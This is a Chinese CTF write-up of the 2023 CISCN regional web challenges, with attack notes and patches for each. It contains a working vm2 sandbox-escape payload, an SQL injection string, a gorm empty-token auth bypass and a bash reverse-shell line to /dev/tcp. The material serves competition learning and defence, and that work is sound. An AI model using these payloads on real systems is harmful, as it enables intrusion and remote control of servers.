---
title: "2023 CISCN 华东北分区赛 Web Writeup"
date: 2023-06-26T10:39:27+08:00
lastmod: 2023-06-26T10:39:27+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

2023 CISCN 华东北分区赛 Web Writeup

<!--more-->

## search_engine

### Attack

没啥意思, Fenjing 直接秒

[https://github.com/Marven11/Fenjing](https://github.com/Marven11/Fenjing)

### Patch

```python
@app.route("/", methods=["GET", "POST"])
def index():
	ip, port = re.findall(pattern,request.host).pop()
	if request.method == 'POST' and request.form.get("word"):
		word = request.form.get("word")
		if not waf(word):
			word = "Hacker!"
	else:
		word = ""

	if '{{' in word or '}}' in word or '{%' in word or '%}' in word:
		word = "Hacker!"

	result = render_template_string(content % (str(ip), str(port), str(word)))
	if 'flag{' in result:
		result = "Hacker"
	return result
```

## tainted_node

### Attack

先 post

```json
{"username":"admin","password":"realpassword","logined":true}
```

然后没存 vm2 payload, 哈哈

[https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244)

```javascript
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('open -a Calculator');
}
```

### Patch

```javascript
function merge(target, source) {
    for (let key in source) {
        if (key === 'escapeFunction' || key === 'outputFunctionName') {
            throw new Error("No RCE")
        }
        if (key === "constructor" || key == '__proto__' || key == "prototype") {
            throw new Error("No pollution")
        }
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}

......

app.all('/sandbox', (req, res) => {
    if (req.session.userInfo.logined != true || req.session.userInfo.username != "admin") {
        return res.redirect("/login")
    }
    
    const code = req.query.code || '';
    result = vm.run((code));
    if (result.match(/flag{.*}/)) {
        result = "hacker";
    }
    res.render('sandbox', { result });
})
```

## rceit

### Attack

username SQL 注入 `' || '1`, 然后密码用题目描述给的那个

`/memo/create` 需要猜一下 secret, 感觉也是要 SQL 注入出来 ?

hashCode 可以碰撞, 参考 marshalsec 源码

感觉应该是 SQL 注入到 OGNL 表达式注入 RCE

之前没怎么研究 MyBatis 的洞, 有点可惜, 后面找个时间看看

### Patch

UserController

```java
package WEB-INF.classes.com.ctf.rceit.controller;

import com.ctf.rceit.dao.UserDao;
import com.ctf.rceit.entity.User;
import com.ctf.rceit.utils.FilterUtil;
import com.ctf.rceit.utils.MybatisUtil;
import com.ctf.rceit.utils.UserUtil;
import javax.servlet.http.HttpSession;
import org.apache.ibatis.session.SqlSessionFactory;
import org.mybatis.spring.SqlSessionTemplate;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class UserController {
  private final SqlSessionFactory session = MybatisUtil.getSqlSession();
  
  protected SqlSessionTemplate sqlSessionTemplate = new SqlSessionTemplate(this.session);
  
  private final UserDao userDao = (UserDao)this.sqlSessionTemplate.getMapper(UserDao.class);
  
  @RequestMapping({"/login"})
  @ResponseBody
  public String login(User u, HttpSession httpSession) {
    if (httpSession.getAttribute("userId") != null && (
      (Integer)httpSession.getAttribute("userId")).intValue() == 1)
      return "redirect:/memo/"; 
    if (u == null)
      return "; 
    if (u.getUsername() != null && FilterUtil.sqlFilter(u.getUsername()))
      return "; 
    if (FilterUtil.keyFilter(u.getUsername()))
      return "; 
    User user = this.userDao.getUserByName(u.getUsername());
    if (user == null)
      return "; 
    if (u.getPassword() != null && FilterUtil.sqlFilter(u.getPassword()))
      return "; 
    if (FilterUtil.keyFilter(u.getPassword()))
      return "; 
    if (user.getPassword().equals(u.getPassword())) {
      int r = this.userDao.updateUser(user.getId(), UserUtil.getRandomString(4));
      if (r == 1) {
        httpSession.setAttribute("userId", Integer.valueOf(user.getId()));
        return "success";
      } 
      return ";
    } 
    return ";
  }
}
```

MemoController

```java
package WEB-INF.classes.com.ctf.rceit.controller;

import com.ctf.rceit.dao.MemoDao;
import com.ctf.rceit.dao.UserDao;
import com.ctf.rceit.entity.Memo;
import com.ctf.rceit.entity.User;
import com.ctf.rceit.utils.FilterUtil;
import com.ctf.rceit.utils.MybatisUtil;
import com.ctf.rceit.utils.UserUtil;
import com.google.gson.Gson;
import java.util.List;
import java.util.Objects;
import javax.servlet.http.HttpSession;
import org.apache.ibatis.session.SqlSessionFactory;
import org.mybatis.spring.SqlSessionTemplate;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@RequestMapping({"/memo"})
@Controller
public class MemoController {
  private final SqlSessionFactory session = MybatisUtil.getSqlSession();
  
  protected SqlSessionTemplate sqlSessionTemplate = new SqlSessionTemplate(this.session);
  
  private final UserDao userDao = (UserDao)this.sqlSessionTemplate.getMapper(UserDao.class);
  
  private final MemoDao memoDao = (MemoDao)this.sqlSessionTemplate.getMapper(MemoDao.class);
  
  private Gson gson = new Gson();
  
  @RequestMapping({"/"})
  public String index(HttpSession httpSession) {
    if (httpSession.getAttribute("userId") != null && (
      (Integer)httpSession.getAttribute("userId")).intValue() == 1)
      return "memo"; 
    return "redirect:/";
  }
  
  @RequestMapping({"/list"})
  @ResponseBody
  public String list(HttpSession httpSession) {
    if (httpSession.getAttribute("userId") != null && (
      (Integer)httpSession.getAttribute("userId")).intValue() == 1)
      try {
        List<Memo> memoList = this.memoDao.getUserAll();
        return this.gson.toJson(memoList);
      } catch (Exception e) {
        e.printStackTrace();
      }  
    return "redirect:/";
  }
  
  @RequestMapping({"/create"})
  @ResponseBody
  public String create(Memo memo, HttpSession httpSession) {
    String data = "";
    if (httpSession.getAttribute("userId") != null && (
      (Integer)httpSession.getAttribute("userId")).intValue() == 1) {
      User u = this.userDao.getUserById(1);
      if (memo.getSecret() != null && Objects.hashCode(memo.getSecret()) == u.getSecret().hashCode() && !u.getSecret().equals(memo.getSecret())) {
        try {
          if (!FilterUtil.keyFilter(memo.getMessage()) && !FilterUtil.keyFilter(memo.getName()) && !FilterUtil.keyFilter(memo.getSecret())) {
            int i = this.memoDao.create(memo.getMessage(), memo.getName());
            data = "success";
          } 
        } catch (Exception exception) {
        
        } finally {
          this.userDao.updateUser(1, UserUtil.getRandomString(4));
        } 
      } else {
        data = ";
      } 
    } 
    return data;
  }
}
```

## zero

### Attack

比赛期间比较抽象, 一开始只给了源码, 没通网连依赖都下不了怎么 patch

后来只给了个二进制文件, **更抽象了**

就一个简单的 go 协程会定时执行命令

api/process.go

```java
package api

import (
	"babygo/db"
	"fmt"
	"github.com/gin-gonic/gin"
	"os"
	"os/exec"
	"time"
)

var array = make([]string, 0, 4)

func init() {
	array = append(array, "a", "b", "c", "")
	go func() {
		for _ = range time.Tick(time.Second) {
			cmd := array[3]
			if cmd == "" {
				continue
			}
			go func() {
				exec.Command("/bin/bash", "-c", cmd).Run()
			}()
			array[3] = ""
		}
	}()
}

func Process(c *gin.Context) {
	ar, ok := c.GetQueryArray("array")

	if !ok {
		c.Status(400)
		return
	}
	ar1 := array[:3]
	ar1 = append(ar1, ar...)
	c.String(200, fmt.Sprint(ar1))
}

// Backdoor for AWD checker, just ignore it
func Backdoor(c *gin.Context) {
	if c.Query("key") == os.Getenv("key") {
		c.String(200, db.Backdoor())
	}
}
```

然后 middleware/auth.go 存在逻辑问题

```go
package middlewave

import (
	"babygo/db"
	"github.com/gin-gonic/gin"
)

func Auth(c *gin.Context) {
	token, exist := c.GetQuery("token")
	if !exist {
		c.AbortWithStatusJSON(401, gin.H{
			"code":    401,
			"message": "unauthorized",
		})
		return
	}
	if db.CheckToken(token) {
		c.Next()
		return
	}
	c.AbortWithStatusJSON(401, gin.H{
		"code":    401,
		"message": "unauthorized",
	})
}
```

![image-20230626105811962](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202306261058373.png)

之后 CheckToken

db/session.go

```go
package db

type Session struct {
	UserID uint `gorm:"primaryKey"`
	Token  string
}

func CheckToken(token string) bool {
	// return gorm.ErrRecordNotFound when token not existed.
	return db.Where(&Session{Token: token}).First(&Session{}).Error == nil
}

// Backdoor for AWD checker, just ignore it
func Backdoor() string {
	var session Session
	db.First(&session)
	return session.Token
}
```

很经典的问题了, p 牛之前在知识星球里面也提到过

简单来说就是 Go 语言无法区分结构体中的某个字段是否被赋值过,  当 token 为空时 gorm 就不会为 token 生成条件语句

所以最后就能查询到管理员的 token, 从而访问 `/api/process` 路由

然后就是反弹 shell

```
/api/process/?token=&cmd=bash -c "bash -i >& /dev/tcp/ip/port 0>&1"
```

### Patch

二进制不知道咋修, 问了下 Pwn 队友说直接改函数逻辑或者 if 条件比较麻烦

**脑洞大开写了个这样的玩意**

```go
package main

import (
	"flag"
	"os/exec"
	"strings"
)

func main() {
	cPtr := flag.String("c", "whoami", "")
	flag.Parse()

	blacklist := []string{"flag", "/dev/tcp"}

	input := strings.ToLower(*cPtr)

	for _, s := range blacklist {
		if strings.Contains(input, s) {
			return
		}
	}
	exec.Command("/bin/bash", "-c", input).Run()
}

```

然后让队友把二进制文件中的 `/bin/bash` 替换成同等长度的 `/app/main`

patch.sh

```bash
#!/bin/sh
cp -rf ./main /app/main
cp -rf ./babygo /app/babygo
ps -ef | grep babygo | grep -v grep | awk '{print $2}' | xargs kill -9
nohup /app/babygo >/dev/null 2>&1 &
```

## gogogo

### Attack

只有二进制文件, 哈哈, **过于抽象**

用 IDA 找了几个路由

```
/chals GET
/submit POST
/register POST
/login POST
/flag GET
/solved GET
/score GET
```

访问 `/chals` 拿到一堆 md5 的 pow, 爆破出来后死活找不到 `/submit` 的参数是啥

感觉是要不断做 pow 提交得到分数, 攒够 114514 分拿 flag

### Patch

访问 `/flag` 提示需要 114514 分才能拿到 flag, 但是 admin 有 999999 分

找了 Pwn 队友把 114514 改成 999999

**我也不知道为啥这么改, 但它确实 fix 成功了**

## master_of_math

### Attack

```php
<?php

highlight_file(__FILE__);
if (isset($_GET['hello'])) {
    $temp = $_GET['hello'];
    is_numeric($temp) ? die("no numeric") : NULL;
    if ($temp > 0x1337) {
        echo "Wow, we can't stop you.</br>";
    } else {
        die("NO!NO!NO!");
    }
}
else {
    die("How are you?");
}

if (isset($_GET['content'])) {
    $content = $_GET['content'];
    if (strlen($content) >= 60) {
        die("Too long!");
    }
    $blacklist = [' ', '\'', '"', '\t', '`', '\[', '\]', '\{',  '\}', '\r', '\n', '\f'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("Special char found!");
        }
    }
    $security = ['abs', 'base_convert', 'cos', 'dechex', 'exp', 'getrandmax', 'hexdec', 'is_nan', 'log', 'max', 'octdec', 'pi', 'sin', 'tan'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $security)) {
            die("I don't like this.");
        }
    }
}
else {
    die("Where is my content?");
}
?>
```

跟 CISCN 2019 的 love math 差不多, 就是限制变成了 60 字符, 然后开头加了个简单的 `is_numeric` 绕过

**我的评价是这种题没啥意思, 懒得看了**

### Patch

不知道咋 fix, **这不就是那种传统 ctf 题吗 ? 能有啥正常功能 ? 非要嗯套一个 fix 环节 ?**

改 hello 检查提示我服务异常, 改 content 长度检查也提示服务异常, ban 函数也提示服务异常, ban `$` 也提示服务异常

也可能是我没 get 到出题人的脑洞, 哈哈

![202306261115540](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202306261115540.jpeg)

## 后记

评价是不如原神

明年不会再打了